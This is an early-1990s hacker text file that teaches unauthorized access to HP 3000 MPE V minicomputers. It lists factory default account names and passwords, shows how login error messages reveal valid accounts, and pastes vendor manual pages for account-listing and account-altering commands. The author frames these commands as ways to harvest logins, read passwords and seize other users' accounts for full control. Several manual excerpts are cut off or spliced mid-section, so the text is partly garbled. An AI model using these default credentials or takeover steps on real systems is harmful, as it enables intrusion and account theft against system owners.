**************THE COMPLETE HEWLETT PACKARD 3000 HACKERS GUIDE*****************

          Presented this 28 day of March 1900 and 91 by AXIS

                Writen and Compiled by Night's Shadow
                With Help from INSANE! (aka Flatliner)


        The HP 3000 is becoming one of the most common main frame of
        today with the very versaltilty and english like comands of the
        MPE V operating system. It power and user friendliness has
        little rival.  As good fortune would have it these qualities that
        have made companys like Boeing swicth to HP 3000's also make it
        the unsecured UNIX of the 90's........



     In the following essay we will cover all aspects of the HP 3000
including, logon, login, passwords, OS, comands that are useful, log
destruction, information retrvial and logout.  The information in this
file is for the sole purpose to be used, there is no disclamer.

     LOGON:

   Logon a HP 3000 is simple just hit the enter key a coupple of times
until you get ":" which in all cases is the prompt.

     LOGIN:

   A normal login is chracterized by entering the command HELLO followed
by USERNAME.ACCOUNTNAME,GROUPNAME. Note that the groupname is almost
always HOME which is the default and almost never need to be typed. So
an example login would be...

            :Hello mgr.sys
               /^    ^\  ^--------\
      Login Command    Username    Accountname

Now the neat thing about a HP 3000 is that they tell you what part of
the login is wrong. Leave out the Hello and get "EXPECTED HELLO COMMAND"
If the account is wrong you get "ACCOUNT DOES NOT EXIST" Note the
username may exist in this case but since the account is wrong it gives
that message.  IF the account exists but the username is wrong you get
"ACCOUNT EXIST, USERNAME DOES NOT". If the account and username are
right but it is not in the home group it gives "ACCOUNT/USERNAME EXIST
BUT NOT IN HOME GROUP".  In this case enter append a group name (which 
will be descussed later).

	PASSWORDS:

    The following are the default Username/accounts combos that have no
passwords attached to them out of the factory:
	
     *MANAGER.SYS			MGR.HPWORD			MGR.CCC
	MANAGER.COGNOS	     *MGR.TELESUP			MGR.RJE
	FIELD.SERVICE		MGR.COGNOS			MGR.ITF3000
     *FIELD.SUPPORT,PUB		MGR.HPONLY		     *MGR.SYS
	MAIL.MAIL		     *MGR.NETBASE			MAIL.TELESUP
     *OPERATOR.SYS		MGR.CNAS		     *MGR.SECURITY
	MGR.REGO

The follow are passworded as such:

	MGR.TELESUP Account password: HPONLY
			User password   : MGR

	MGR.SYS     Account password :LOTUS

	FIELD.SERVRICE Account password: HPWORD

Well that is all the back doors the guys over at Hewlett Packard wrote,
as long as I have hacked HP3000's I have never seen one where you can't
get in on the defaults (smile).

Note that you can switch the defaults around as long as you keep the 
account side on the account side and the user side on the user side.

Now about groups, if you run into a login that gives you the "ACCOUNT/
USER GOOD BUT NOT IN HOME GROUP" don't worry there are two other default
groups built into the machine ,PUB and ,DATA give them a try.

The combos with the * have ether AM accsess or NM this is prefered.


	YOUR IN:

Proablly with shit acsess.  Just like any system you never get the kicken
acsess the first try, so in this section I will descuss how you can find
other accounts and gain higher acsess.


The first thing you need to do is to find out how much acsess you really
have this can be done with two commands, first:
     

     REPORT [groupset] [,listfile] [;VS=volset]

PARAMETERS

groupset            Specifies the accounts and groups for which
                    information is to be listed.  The permissible
                    entries, some of which use wildcard characters, and
                    their capability requirements (account manager (AM)
                    and/or system manager (SM)) are listed below.

                    group     Reports on the specified group in the
                              logon account.This is the default for
                              standard users, who may specify only their
                              logon group.

                    @         Reports on all groups in the logon
                              account. This isthe default for account
                              managers, but may be executed by users
                              with AM or SM capability.

                    group.acct  Reports on the specified group in the
                              specified account. This requires SM
                              capability.

                    @.acct    Reports on all groups in the specified
                              account. This requires AM capability (if
                              it is the logon account) or SM capability
                              for any account.

                    @.@       Reports on all groups in all accounts.
                              This is the default for system managers
                              and requires SM capability.

                    group.@   Reports on specified group in any account.
                              This requires SM capability.

                    The characters @, #, and ? can be used as wildcard
                    characters, but count toward the eight-character
                    limit. These wildcard characters have the following
                    meanings.

                    @         Specifies zero or more alphanumeric
                              characters and denotes all members of the
                              set.

                    #         Specifies one numeric character.

                    ?         Specifies one alphanumeric character.

                    The characters can be used as follows.

                    n@        Report on all groups starting with the
                              character "n".

                    @n        Report on all groups ending with the
                              character "n".

                    n@x       Report on all groups starting with the
                              character "n" and ending with the
                              character "x".

                    n##...#   Report on all groups starting with the
                              character "n" followed by up to seven
                              digits.

                    ?n@       Report on all groups whose second
                              character is "n".

                    n?        Report on all two-character groups
                              starting with the character "n".

                    ?n        Report on all two-character groups ending
                              with the character "n".

                    These characters, when placed appropriately in the
                    <groupset> parameter, may also be used to report on
                    accounts.

listfile            Actual file designator of the output file to which
                    information is to be written. The default is
                    $STDLIST, but output may be redirected with a file
                    equation as follows:

                    FILE LIST1,DEV=LP
                    REPORT, *LIST1

volset              Informs MPE V/E to report accounting information for
                    the specified volume set.

USE

     You may issue this command from a session, job, program, or in
     BREAK. Pressing [BREAK] aborts execution.  You must have account
     manager (AM) or system manager (SM) capability to execute this
     command.

OPERATION

     The REPORT command displays the total resource usage logged against
     accounts and groups, and the limits on those resources.  For
     standard users, data is displayed for their group only; an account
     manager may specify all groups in his or her account; the system
     manager may specify any or all groups in any or all accounts.

     The information includes usage counts and limits for permanent file
     space (in sectors), CPU time (in seconds), and session connect time
     (in minutes).  The file space usage count reflects the number of
     sectors used at the time the REPORT command was issued. However,
     CPU time and connect time usage appear as they were immediately
     before the beginning of the current job.

EXAMPLE

     To obtain accounting information for your group, enter the REPORT
     command.  Accounting information is displayed in a format similar
     to that of the SOPRM account shown below:

     REPORT @.SOPRM

     ACCOUNT       FILESPACE-SECTORS     CPU-SECONDS CONNECT-MINUTES
     /GROUP       COUNT    LIMIT    COUNT    LIMIT    COUNT    LIMIT
     SOPRM           99004       **    99057       **    88407       **
     /GLOSSARY     1068       **      542       **      656       **
     /PUB           182       **      123       **     1155       **
     /SECT1         180       **       85       **      429       **

The following can be one of the most useful commands on the system
for geting other logins.  Most people never password there Account/User
so it is just a matter of list the people that are on the machine--
this is a way to do it. It shows people that are runing jobs (which is 
any deamon task) and anyone of inportance will be running a job.


SHOWJOB

     Displays the status information about jobs/sessions.

SYNTAX

              [#]Snnn
              [#]Jnnn
     SHOWJOB [ STATUS           ] [;*listfile]
               SCHED
               item[;item[;...]]

PARAMETERS

[#]Snnn             The session number (assigned by MPE) of the session
                    for which the status information is to be displayed.
                    The information appears in Type I format, described
                    under "OPERATION".  Default is that the status
                    information for all jobs/sessions is displayed.

[#]Jnnn             The job number (assigned by MPE) of the job for
                    which status information is to be displayed.  The
                    information is in Type I format, described under
                    "OPERATION".  Default is that the status information
                    for all jobs/sessions is displayed.

STATUS              Lists the number of jobs and sessions in each
                    processing state and the current jobfence and
                    job/session limits.  This information is in Type II
                    format, described under "OPERATION".  Default is
                    that the status information for all job/sessions is
                    displayed.

SCHED               Displays only the scheduled jobs.  The information
                    is in Type III format, described under "OPERATION".

*listfile           Formal file designator of the file on which the
                    output listing is written. A backreference to a FILE
                    equation is required. The <listfile> is a temporary
                    file with record size of 256 bytes, blocked one
                    record per block, with Carriage Control (CCTL), with
                    the time and date displayed. You can override the
                    default characteristics of <listfile> with the FILE
                    command. Default is $STDLIST.

item                A list of jobs/sessions whose status is displayed.
                    Default is that the status information for all

                    below.
SYNTAX FOR ITEM

               {@J               }     {INTRO}
     [JOB=     {@S               }]  [;{EXEC }] {WAIT [,N]}
               {@                }     {SUSP }        [,D]
               {[jsname,]username}]

PARAMETERS FOR ITEM

JOB=                A list of jobs/sessions for which status information
                    is to be displayed.  Use one of the following
                    options:

                    @J   Displays status information for all jobs.

                    @S   Displays status information for all sessions.

                    @    Displays status information for all jobs and
                         sessions.

                    [jsname>,].username>.acctname

                              The <jsname> is an optional name given to
                              the session or job by the user. The
                              name> parameter is the username
                              established by the account manager. This
                              name may consist of one to eight
                              alphanumeric characters beginning with an
                              alphabetic character.  The <accountname>
                              parameter is the name of the account
                              established by the system manager.  This
                              name may consist of one to eight
                              alphanumeric characters beginning with an
                              alphabetic character. The "@" can be used
                              to replace the <jsname> or <username> in a
                              specified account.

INTRO, EXEC, SUSP, or WAIT

                    Displays the status of all jobs or sessions in a
                    specified state. INTRO means that the job is
                    introduced. In this case the spooler process
                    validates the JOB command and, if the job is
                    legitimate, copies the job input records to disk.
                    EXEC means that the job is executing. SUSP means
                    that the job or session is suspended, because table
                    entries or system resources are unavailable. WAIT
                    means that there are no available list devices for
                    the job. WAIT has the following subparameters:

                    N    Displays the status of nondeferred READY
                         devicefiles.

                    D    Displays the status of deferred READY
                         devicefiles.

                    If information for only one devicefile is displayed,
                    output is in Type I format; if information for more
                    than one devicefile is displayed, output is in Type
                    I followed by Type II format.  (Format types are
                    described under "OPERATION".)

USE

     This command may be issued from a session, job, in BREAK, or from a
     program.  It is breakable (aborts execution).

OPERATION

     This command enables you to determine the number of jobs and
     sessions in each processing state, the current jobfence and
     job/session limits, and allows you to keep track of individual
     spooled and streamed jobs that are entered in the system. 

EXAMPLE

     To determine the number of jobs and sessions in each processing
     state, the current jobfence and the job/session limits, enter:

     SHOWJOB STATUS
     6 JOBS:
          0 INTRO
          0 WAIT; INCL 0 DEFERRED
          6 EXEC; INCL 6 SESSIONS
          0 SUSP
     JOBFENCE= 0; JLIMIT= 3; SLIMIT= 16

     To get a report on all jobs and sessions in the system, enter:

     SHOWJOB

     JOBNUM   STATE IPRI  JIN  JLIST    INTRODUCED JOB NAME
     #S745    EXEC         29  29       MON  2:53P DL,SPL.ALANG
     #S746    EXEC         26  26       MON  2:53P CLI.AOPSYS

     2 JOBS:
          1 INTRO
          0 WAIT; INCL 0 DEFERRED
          2 EXEC; INCL 2 SESSIONS
          0 SUSP
     JOBFENCE= 2; JLIMIT= 1; SLIMIT= 16



     The following example of a SHOWJOB command sequence illustrates an
     override of the default characteristics of <listfile> with the FILE
     command, and shows the output produced with the new <listfile>
     characteristics:

     FILE A;REC=40,1,F,ASCII;NOCCTL

     The SHOWJOB command reports a job or session as being in EXEC* when
     it is initializing. After initialization is complete, the state
     will change to EXEC . The number shown in the EXEC state is the sum
     of the jobs and sessions in both EXEC and EXEC*.

The next comand list all accounts and there `ENCRYPTED' password.  The
neat thing is that if a person makes there onw password and doesnt have
system operator encode it (as the lamers often do) it can be read!

LISTACCT

     Lists the attributes for one account, with AM (account manager)
     capability, or for any or all accounts, with SM (system manager)
     capability.

SYNTAX

     LISTACCT [{@   }][,listfile]
               {acct}]

PARAMETERS

@                   Specifies all accounts. This is the default for
                    users with SM capability, which is required to list
                    all accounts.

acct                The name of the account whose attributes are to be
                    listed. Account managers may specify only their own
                    account. The default is the logon account.

The characters @, #, and ? can be used as wildcard characters, but count
toward the eight-character limit. These wildcard characters have the
following meanings:

@                   Specifies zero or more alphanumeric characters and
                    denotes all members of the set.

#                   Specifies one numeric character.

?                   Specifies one alphanumeric character.

You can use the characters as follows:

n@                  List all accounts starting with the character "n".

@n                  Lists all accounts ending with the character "n".

n@x                 Lists all accounts starting with the character "n"
                    and ending with the character "x".

n##...#             Lists all accounts starting with the character "n"
                    followed by up to seven digits.

?n@                 Lists all accounts whose second character is "n".

n?                  List all two-character accounts starting with the
                    character "n".

?n                  List all two-character accounts ending with the
                    character "n".

listfile            Destination of the attribute listing. The default is
                    $STDLIST, but the output may be redirected with the
                    FILE command.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command.  You must
     have system manager (SM) or account manager (AM) capability to
     execute this command.

OPERATION

     This command lists the attributes for one account (AM capability)
     or for any or all accounts (SM capability).

     The listing appears as an octal dump of the account entry; each is
     headed by A = "  " and the account name. When the dump contains
     alphanumeric data, a translation into ASCII appears to the right of
     each line. The following is a sample listing of an octal dump:

     A  =  SYS
     051531 051440 020040 020040 000006 000007 177607 000713

The next is the same as above but it is for groups.

LISTGROUP

     Prints a list of attributes for groups.

SYNTAX

                {group.acct}
                {group     }
     LISTGROUP  {@.acct    } [,listfile]
                {@         }
                {@.@       }


PARAMETERS

@                   Specifies that all groups in the logon account are
                    to be listed. This is the default.

@.@                 Specifies that all groups in all accounts are to be
                    listed.  Only users with SM capability may specify
                    this option.  The default is @.

group.acct          Specifies the group and account to be listed.
                    Account managers cannot specify an account other
                    than their own.

group               Specifies the group (in the logon account) to be
                    listed. The default is @.

@.acct              Specifies that all groups in the designated account
                    are to be listed.  If an account manager specifies
                    an account, it must be his or her own account.  The
                    default is @.

The characters @, #, and ? can be used as wildcard characters, but count
toward the eight-character limit. These wildcard characters have the
following meanings:

          @                   Specifies one or more alphanumeric
                              characters ordenotes all members of the
                              set.

          #                   Specifies one numeric character.

          ?                   Specifies one alphanumeric character.

          The characters can be used as follows:

          n@                  List all groups starting with the
                               character "n".

          @n                  List all groups ending with the character
                               "n".

          n@x                 List all groups starting with the
                              character "n" and ending with the
                              character "x".

          n##...#             List all groups starting with the
                              character "n" followed by up to seven
                              digits.

          ?n@                 List all groups whose second character is
                              "n".

          n?                  List all two-character groups starting
                              with the character "n".

          ?n                  List all two-character groups ending with
                              the character "n".

listfile            Destination of the attribute listing. The default is
                    $STDLIST, but the output may be redirected with the
                    FILE command.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] suspends execution.  You must have account
     manager (AM) or system manager (SM) capability to execute this
     command.

OPERATION

     This command lists the attributes for all groups in one account (AM
     capability) or all groups in all accounts (SM capability).  Also
     available is information on groups spanned to private volumes (PV),
     whether or not the volumes are mounted when the information is
     requested.

     A sample octal dump appears below. The listing includes both group
     and system information, headed by "G = " and the group's name.  A
     translation of those bytes that contain alphanumeric ASCII
     characters appears to the right of each line of the octal dump.

G  =  PUB

 39            GMOUNTRECNTR
 40            GSPARE

Where:

GSAVEFIPNTR         contains the original group file index pointer or an
                    address relative to the base of the SYSVS   (system
                    volume set) directory.

GMOUNTRECNTR        is a counter which keeps track of the number of
                    times a group's home volume set has been bound.

GSPARE              is an MPE V/E reserved word.

The group name and password are eight-character names, right-padded with
blanks.

The double-word numeric quantities are double-word integers, with
%17777777777 representing "unlimited".

Group attributes duplicate the second word of the double-word capability
returned by the -WHO intrinsic.

                      {@        }
                      {@.@      }

PARAMETERS

user.acct           The specified user in the specified account.  If
                    account managers specify <acct>, it must be their
                    own account.

user                The specified user in the logon account.

@.acct              All users in the specified account.  Account
                    managers may specify their own account only.

                    default.

@.@                 All users in all accounts. (The attributes of the
                    account are also listed.)  This option can be
                    specified only by users with system manager (SM)
                    capability.

                    The characters @, #, and ? can be used as wildcard
                    characters, but count toward the eight-character
                    limit.  These wildcard characters have the following
                    meanings:

                    @         Specifies zero or more alphanumeric
                              characters and denotes all members of the
                              set.

                    #         Specifies one numeric character.

                    ?         Specifies one alphanumeric character.

                    The characters can be used as follows:

                    $STDLIST, but the output may be redirected with the
                    FILE command.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] suspends execution.  You must have AM
     (account manager) or SM (system manager) capability to execute this
     command.

OPERATION

     This command generates an octal dump of the attributes currently
     assigned to users. Each entry is headed by "U = " and the user's
     name; it contains both user and system information. A translation
     of those bytes containing ASCII data appears to the right of each
     line, as shown in the sample below. Account managers may list only
     users in their own account, while system managers may specify all
     users in all accounts on the system.

     Each word or group of words is decoded in the following table:

      WORDS         CONTENT

      0-3           User name
      4-5           Capability
      6-7           Local attributes
      8-11          Password
      12-15         Home group
      16            Number of users logged-on
      17            Maximum job priority
      18            User entry in COMMAND.PUB.SYS

     The user name, password, and home group are eight-character names,
     padded from the right with blanks.

          The maximum job priority is a numerical quantity; 150   (%226) for
     example, represents the CS subqueue.

This command let's you alter anthor person account so you can seize it 
and give your self god acsess.

ALTACCT

     Changes the attributes of an existing account.

SYNTAX

     ALTACCT acctname [;PASS=[password]] [;FILES=[filespace]]

     [;CPU=[cpu]]  [;CONNECT=[connect]] [;CAP=[capabilitylist]]

     [;ACCESS=[(fileaccess)]] [;MAXPRI=[subqueuename]]

     [;LOCATTR=[localattribute]] [;VS=[volset:{ALT }]]
                                              {SPAN}
     [;USERPASS=[{REQ}]]
                 {OPT}   (1)

(1) The USERPASS parameter is only available if the HP Security Monitor
(HP30392) has been installed.

PARAMETERS

acctname            The name of the account to be altered.

password            Account password (used only for verifying logon
                    access).  If you omit this parameter, no change is
                    made.  If the system operator enters
                    ";PASS=[RETURN]", then the existing password is
                    removed.

filespace           Disk storage limit, in sectors, for the permanent
                    files in the account.  The <filespace> limit cannot
                    be less than the number of sectors currently in use
                    for the account.  The default is unlimited file
                    space.

cpu                 The limit on cumulative CPU time, in seconds, for
                    the account. This limit is checked only when a job
                    or session is initiated, and therefore never causes
                    the job or session to abort. The maximum value
                    allowed is 2,147,483,647 seconds.  The default is
                    unlimited CPU time. The counter may be set to zero
                    with the RESETACCT command.

connect             The limit on total cumulative job or session connect
                    time, in minutes, for the account.  This limit is
                    checked at logon and every time a process
                    terminates.  The maximum value allowed is
                    2,147,483,647 minutes.  The default is unlimited
                    connect time. The counter may be set to zero with
                    the RESETACCT command.

capabilitylist      List of capabilities, separated by commas, permitted
                    to the account.  Each capability is denoted by a
                    two-letter mnemonic, as follows:

                    System Manager                =    SM
                    Account Manager               =    AM
                    Account Librarian             =    AL
                    Group Librarian               =    GL
                    Diagnostician                 =    DI
                    System Supervisor             =    OP
                    Network Administrator         =    NA
                    Node Manager                  =    NM
                    Permanent Files               =    SF
                    Access to nonsharable I/O devices  ND
                    Use Volumes                   =    UV
                    Create Volumes                =    CV
                    Use Communications   Subsystem=    CS
                    Programmatic Sessions         =    PS
                    User Logging                  =    LG
                    Process Handling              =    PH
                    Extra Data Segments           =    DS
                    Multiple RINs                 =    MR
                    Privileged Mode               =    PM
                    Interactive Access            =    IA
                    Local Batch Access            =    BA

                    The default is "AM,AL,GL,SF,ND,IA,BA" , except for
                    the SYS account. This account has no true default:
                    it is assigned the maximum account capabilities when
                    the system is delivered and, under normal
                    circumstances, should not be altered.  CV
                    capability, which permits account members to create
                    private volumes, automatically gives the account UV
                    capability, allowing account members to use private
                    volumes as well.

fileaccess          The restrictions on file access pertinent to this
                    account. The default is R,A,L,W,X:AC, entered as
                    follows:

                     [[{R} [,...]:{ANY}] [;...]]
                       {L}
                       {A}
                       {W}
                       {X}


                    where R , L , A , W and X specify modes of access by
                    types of users (ANY and/or AC ) as follows:

                     R  =  READ
                     L  =  LOCK (allows exclusive access to file)
                     A  =  APPEND (implicitly specifies L also)
                     W  =  WRITE (implicitly specifies A and L also)
                     X  =  EXECUTE

                    The user types are specified as follows:

                    ANY  =  Any user
                    AC   =  Member of this account only


subqueuename        Name of the highest priority subqueue that can be
                    requested by any process of any job or session in
                    the account, specified as AS, BS, CS, DS or ES. The
                    default is CS .

IMPORTANT NOTE:

 User processes executing in the AS or BS subqueues can deadlock the
system. If you assign these subqueues to non-priority processes, other
critical system processes may be prevented from executing. Exercise
extreme caution when choosing subqueues.

localattribute      Local attribute of the account, as defined at the
                    installation site. This is a double-word bitmap, of
                    arbitrary meaning, that might be used to further
                    classify accounts.  Although it is not part of
                    standard MPE V/E security provisions, it is
                    available to processes through the WHO intrinsic.
                    Programmers may use <localattribute> in their own
                    programs to provide security.  The default is
                    double-word 0 (null).

volset              The volume set or class reference which, when fully
                    qualified, is in the form
                    <vcsid.groupname.acctname>.  <vcsid> refers to a
                    previously defined volume set or class definition.

SPAN                Indicates that the <acctname> is to be inserted in
                    the accounting directory of the specified volume set
                    (volset).  The specified volume set must already be
                    mounted (via a MOUNT command) for the SPAN operation
                    to succeed.

ALT                 Directs the altering of an account or group entry on
                    the specified volume set.  This option is useful
                    only if it is necessary to alter account and group
                    file space limits for entries that have already been
                    spanned.

OPT                 USERPASS=OPT specifies that users in this account
                    may or may not have passwords. If you do not use the
                    USERPASS parameter, the old value remains. It is
                    available only if the HP Security Monitor has been
                    installed.

USE

     You may issue this command from a session, job, program, or in
     BREAK. Pressing [BREAK] has no effect on this command.  You must
     have system manager (SM) capability to use this command.

OPERATION

     The system manager uses ALTACCT to change the attributes of an
     existing account. You may enter multiple keywords on a single
     command line,  as shown in the examples. When you change one
     capability in a <capabilitylist> containing several defined values,
     you must respecify the entire <capabilitylist>. When an entire
     keyword parameter group is omitted from the ALTACCT command, that
     parameter remains unchanged for the account.  When a keyword is
     included, but the corresponding parameter is omitted (as in ";PASS=
     "), the default value is assigned.

     The USERPASS= parameter must be used in conjunction with REQ or
     OPT. The old value remains in effect if the USERPASS parameter is
     omitted. This is only valid if you have installed the HP Security
     Monitor.

     Parameter                Default Values
     password            No password

     filespace           Unlimited

     cpu                 Unlimited

     connect             Unlimited

     capabilitylist      AM,AL,GL,SF,ND,IA,BA (All accounts except SYS)
                         SM,AM,AL,GL,DI,OP,SF,ND,PH,DS,MR,PM,IA,BA (SYS
                         account only)

     fileaccess          R,A,W,L,X:AC (All accounts except SYS)
                         R,X:ANY;A,W,L:AC (SYS account only)

     subqueuename        CS subqueue

     localattribute      Double-word 0 (null)

     Any value changed with ALTACCT takes effect the next time MPE V/E
     is requested to check the value. If an attribute is removed from an
     account while users are logged on, they are not affected until they
     end the job or session and logon again.

      MPE V/E does not automatically generate a message informing users
     of the change; it is the system operator's responsibility to warn
     account members in advance of any changes. If the system operator
     takes a capability away from an account, all account members and
     groups within the account also lose the capability.

     You cannot remove system manager (SM) capability from the SYS
     account.  You also cannot take AM capability away from any account.
     If more than one person is assigned AM capability within the
     account, you can remove AM capability from all but one of the users
     assigned it, that is, the last.

EXAMPLE

     To change an account named AC2 so that its <password> is GLOBALX ,
     and its <filespace> is limited to 50,000 sectors, enter:

     ALTACCT AC2;PASS=GLOBALX;FILES=50000

The following lets you change the state of a user, leting you steal a 
user.

ALTUSER

     Alters attributes currently defined for a user.

SYNTAX

     ALTUSER username  [;PASS=[password]]  [;CAP=[capabilitylist]]

     [;MAXPRI=[subqueuename]]  [;LOCATTR=[localattribute]]

     [;HOME=[homegroupname]]  [;USERPASS=[{REQ}][,EXPIRED]]  (1)
                                          {OPT}]

     (1) The USERPASS parameter is only available if the HP Security
     Monitor has been installed.


PARAMETERS

username            The name assigned to the user for a logon account.

password            The new password to be assigned to the user.  When
                    you enter ";PASS=[RETURN]", any existing password is
                    removed. If you omit this parameter entirely, the
                    password remains unchanged.

capabilitylist      The list of capabilities, separated by commas,
                    permitted to this user. The capabilities assigned to
                    the user cannot exceed those assigned to the
                    account. Each capability is denoted by a two-letter
                    mnemonic as follows:

                    System Manager                      =   SM
                    Account Manager                     =   AM

                    Node Manager                        =   NM
                    Permanent Files                     =   SF
                    Access to non-sharable I/O devices  =   ND
                    Use Volumes                         =   UV
                    Create Volumes                      =   CV
                    Use Communications Subsystem        =   CS
                    User Logging                        =   LG
                    Process Handling                    =   PH
                    Extra Data Segments                 =   DS

                    Programmatic Sessions               =   PS

                    The default is SF , ND , IA , and BA. Note that CV
                    automatically gives the user UV capability.

subqueuename        The name of the highest priority subqueue that may
                    be requested for any job or session initiated by the
                    user. This parameter is specified as AS, BS, CS, DS,
                    or ES, but cannot be greater than that specified
                    with the NEWACCT or ALTACCT commands.  The default
                    is CS. The <subqueuename> defined for the user is
                    checked against the <subqueuename> defined for the
                    account at logon, and the lower priority of the two
                    is used as the maximum priority for the job or
                    session.  If you make a request for priority when
                    you log on, it is checked against the <subqueuename>
                    defined for you as the user, and you are granted the
                    lower of the two values.

localattribute      Defined at the installation site, this is an
                    arbitrary double-word bitmap used to further
                    classify users.  Although it is not part of standard
                    MPE V/E security provisions, programmers may define
                    it (through the WHO intrinsic) to enhance the
                    security of their own programs.  The bitmap for the
                    user's local attributes must be a subset of the
                    bitmap for the account's local attributes. The
                    ALTUSER command checks the local attributes of the
                    user with those of the account.  The default is
                    double-word 0 (null).

homegroupname       The name of an existing group to be assigned as the
                    home group for this user.  The first user
                    established when an account is created is by default
                    assigned PUB as the <homegroup>. Subsequent new
                    users have by default no <homegroup> assigned. If no
                    <homegroup> is assigned, the user must always
                    specify an existing group when logging on.


OPT                 USERPASS=OPT specifies that this user may or may not
                    have a password. It is available only if the HP
                    Security Monitor has been installed.

EXPIRED             The password expires immediately. The user cannot
                    logon without selecting a new password. It is only
                    available if the HP Security Monitor has been
                    installed.



USE

     You may issue this command from a session, job, program, or in
     BREAK. Pressing [BREAK] has no effect on this command.  You must
     have account manager (AM) capability  to use this command.



OPERATION

     The ALTUSER command allows the account manager to change the
     password, capabilities, processing subqueue, security checking, and
     home group currently defined for a user. More than one of these
     attributes may be changed at a time by entering multiple keyword
     parameters on a single command line, using the ; delimiter.

     To change an attribute, enter the keyword and its new value. If you
     enter the keyword and no corresponding parameter, the default value
     is assigned. When an entire keyword parameter group is omitted from
     the ALTUSER command, the corresponding value for the user remains
     unchanged. When a keyword is included, but the corresponding
     parameter is omitted (as in ;PASS= ), a default value is assigned
     as follows:

      Parameter          Default Values

      password           Null (no password)

      capabilitylist     SF, ND, IA, and BA (provided these capabilities
                          have been specified for the account)

      subqueuename       CS

      localattribute     Null (double-word 0)

      homegroupname      The first user established when the account is
                         created has PUB assigned as home. Subsequent
                         users are not assigned a home group. If a user
                         has no home group assigned, an existing group
                         must be specified when initiating a job or a
                         session.

     When a parameter is modified with the ALTUSER command, it is
     immediately registered in the directory. However, it does not
     affect users who are currently logged on to the system. They are
     affected the next time they logon to the same user name and
     account. For this reason, you should warn users in advance of the
     intended changes.

     You should avoid changing the <capabilitylist> or <homegroupname>
     of the user MANAGER.SYS.  SM capability cannot be taken away from
     MANAGER.SYS.

     If more than one user within an account is assigned AM capability,
     the capability can be removed from all but one user assigned it.
     The last user retains the AM capability.

EXAMPLE

     Suppose an account's capabilities are AM, AL, GL, SF, ND, PH, DS,
     MR, IA, and BA .  To change the <capabilitylist> of the user JONES
     from IA, BA, SF, PH, DS  to include multiple RIN capability (MR),
     enter:

     ALTUSER JONES;CAP=IA,BA,SF,PH,DS,MR

     To alter two attributes, <password> and <subqueuename>, for user
     JONES enter:

    NEWACCT:

     
     Creates a new account and an account manager and PUB group
     associated with it.

SYNTAX

     NEWACCT acctname,mgrname   [;PASS=[password]]

     [;FILES=[filespace]]   [;CPU=[cpu]]

     [;CONNECT=[connect]]   [;CAP=[capabilitylist]]

     [;ACCESS=[fileaccess]]   [;MAXPRI=[subqueuename]]

     [;LOCATTR=[localattribute]]   [;VS=[volset:SPAN]]

     [;USERPASS=[{REQ}]]  (1)
                 {OPT}

     (1) The USERPASS parameter is available only if the HP Security
     Monitor (HP30392) has been installed.

PARAMETERS

acctname            Name to be assigned to the new account. This name
                    must contain from one to eight alphanumeric
                    characters, beginning with an alphabetic character.

mgrname             Name of the account manager. This is always the
                    first user created under the account. The account
                    manager receives the following attributes:

                    * User Password          None
                    * Capability List        Same as the account
                                             capability list
                    * Scheduling Priority    Same as the account maximum
                                             priority
                    * Local Attribute        Same as the account local
                                             attributes
                    * Home Group             PUB

                    The attributes of an account manager may be changed
                    with the ALTUSER command after <mgrname> is defined.
                    However, this user is never granted attributes
                    greater than those assigned to the account.

password            Account password, used for verifying logon access
                    only. This password must contain from one to eight
                    alphanumeric characters beginning with an alphabetic
                    character.  The default is that no password is
                    assigned.

filespace           The disk storage limit, in sectors, for the
                    permanent files of the account.  The maximum value
                    you may define is 2,147,483,647 sectors.  The
                    default is unlimited file space.

cpu                 Limit on total CPU time, in seconds, for this
                    account.  This limit is checked only when a job or
                    session is initiated. Thus, the limit never causes
                    the job or session to abort.  The maximum value you
                    may define with NEWACCT is 2,147,483,647 seconds.
                    The default is that no limit is assigned.

connect    Limit on total session connect time, in minutes, for the
                    account.  This limit is checked at logon, and when
                    the job or session initiates a new process.  The
                    maximum value you may define is 2,147,483,647
                    minutes.  The default is that no limit is assigned.

capabilitylist      List of capabilities, separated by commas, permitted
                    to this account.  Each capability is denoted by a
                    two-letter mnemonic, as follows:

                    The default is AM,AL,GL,SF,ND,IA,BA.

fileaccess          File access restrictions assigned to the account.
                    The default is R,L,A,W,X:AC.

                     [{R} [,...]:{ANY} ] [;...]
                      {L}
                      {A}
                      {W}
                      {X}

                    where R, L, A, W, and/or X specify modes of access
                    by types of users (ANY or AC ) as follows:

                    R   = READ
                    L   = LOCK (allows exclusive access to file)
                    A   = APPEND (implicitly specifies L as well)
                    W   = WRITE (implicitly specifies A and L as well)
                    X   = EXECUTE

                    The user types are specified as follows:

                    ANY   =  Any user
                    AC    =  Member of this account only

                    The default is no security restrictions at the
                    account level. Two or more modes may be specified if
                    they are separated by commas. Both user types may be
                    specified if they are separated by commas.

subqueuename        The name of the subqueue indicating the  highest
                    priority that can be requested by any process during
                    any job or session in the account. This parameter is
                    specified as AS, BS, CS, DS, or ES.

localattribute      The local attribute of the account, as defined at
                    the installation site.  This is a double-word bit
                    map used to further classify accounts.  When it is
                    not part of standard MPE V/E security provisions,
                    programmers may define local attributes (which are
                    checked by the -WHO intrinsic) to enhance their
                    software's security.  The default is double-word 0 .

volset              The volume set or class reference which, when fully
                    qualified, is in the form
                    <vcsid.groupname.acctname>.  <vcsid> refers to a
                    previously defined volume set or class.

SPAN                Specifies that the <accountname> is to be inserted
                    in the accounting directory of the specified volume
                    set (volset).  The specified volume set must already
                    be physically mounted for the SPAN operation to
                    succeed.

                    The associated account manager and PUB group are not
                    created in the accounting directory of the specified
                    volume set.

                    Once the account has been spanned to the volume set,
                    it does not need to be spanned again on another
                    system which shares the volume set under the same
                    account name.  The <volset> parameter is not
                    necessary.

REQ                 USERPASS=REQ specifies that all users in the account
                    are to have non-blank passwords. If you require user
                    passwords, MPE V/E assigns the account manager a
                    blank, expired password. The account manager must
                    select a new password the first time the Manager
                    logs on. It is available only if the HP Security
                    Monitor has been installed.

OPT                 USERPASS=OPT specifies that users of the account may
                    or may not have passwords. This is the default. It
                    is available only if the HP Security Monitor has
                    been installed.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command.  You must
     have system manager (SM) capability to execute this command.

OPERATION

     The NEWACCT command may only be executed by the system manager. The
     system manager is responsible for establishing the accounting
     structure best suited to the computer installation.

     When a keyword is specified but its corresponding parameter is
     omitted (as in ;ACCESS=  ), the default value for that keyword is
